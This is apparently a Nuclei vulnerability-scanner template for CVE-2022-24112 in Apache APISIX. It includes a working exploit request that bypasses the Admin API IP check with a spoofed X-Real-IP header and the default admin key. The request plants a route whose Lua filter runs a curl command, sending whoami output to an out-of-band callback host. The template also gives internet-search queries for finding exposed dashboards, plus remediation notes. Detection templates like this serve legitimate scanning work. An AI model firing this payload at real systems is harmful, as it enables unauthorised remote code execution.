id: CVE-2022-24112
info:
  name: Apache APISIX - Remote Code Execution
  author: Mr-xn
  severity: critical
  description: Apache APISIX has a vulnerability that can result in remote code execution
    when attackers exploit the batch-requests plugin to bypass IP restrictions of
    the Admin API.
  reference:
  - https://www.openwall.com/lists/oss-security/2022/02/11/3
  - https://twitter.com/sirifu4k1/status/1496043663704858625
  - https://apisix.apache.org/zh/docs/apisix/plugins/batch-requests
  - https://nvd.nist.gov/vuln/detail/CVE-2022-24112
  remediation: Upgrade to 2.10.4 or 2.12.1. Or, explicitly configure the enabled plugins
    in `conf/config.yaml` and ensure `batch-requests` is disabled. (Or just comment
    out `batch-requests` in `conf/config-default.yaml`).
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-24112
    cwe-id: CWE-290
  metadata:
    fofa-query: title="Apache APISIX Dashboard"
    product: https://apisix.apache.org
    shodan-query: title:"Apache APISIX Dashboard"
    impact: The vulnerability in Apache APISIX could lead to remote code execution
      and allow an attacker to bypass IP restrictions, potentially resulting in significant
      impact on the security and functionality of the affected system.
    recommendation: Install the latest update or patch to address the vulnerability
      in Apache APISIX and ensure that the admin key is changed and IP restrictions
      are properly configured.
  tags: cve,cve2022,apache,rce,apisix,oast,kev
requests:
- raw:
  - "POST /apisix/batch-requests HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    Accept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n{\n  \"headers\"\
    :{\n    \"X-Real-IP\":\"127.0.0.1\",\n    \"Content-Type\":\"application/json\"\
    \n  },\n  \"timeout\":1500,\n  \"pipeline\":[\n    {\n      \"method\":\"PUT\"\
    ,\n      \"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\"\
    ,\n      \"body\":\"{\\r\\n \\\"name\\\": \\\"test\\\", \\\"method\\\": [\\\"\
    GET\\\"],\\r\\n \\\"uri\\\": \\\"/api/{{randstr}}\\\",\\r\\n \\\"upstream\\\"\
    :{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"httpbin.org:80\\\":1}}\\\
    r\\n,\\r\\n\\\"filter_func\\\": \\\"function(vars) os.execute('curl {{interactsh-url}}/`whoami`');\
    \ return true end\\\"}\"\n    }\n  ]\n}\n"
  - 'GET /api/{{randstr}} HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    '
  req-condition: true
  matchers-condition: and
  matchers:
  - type: word
    part: body_1
    words:
    - '"reason":"OK"'
    - '"status":200'
    condition: and
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - http
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - GET \/([a-z-]+) HTTP
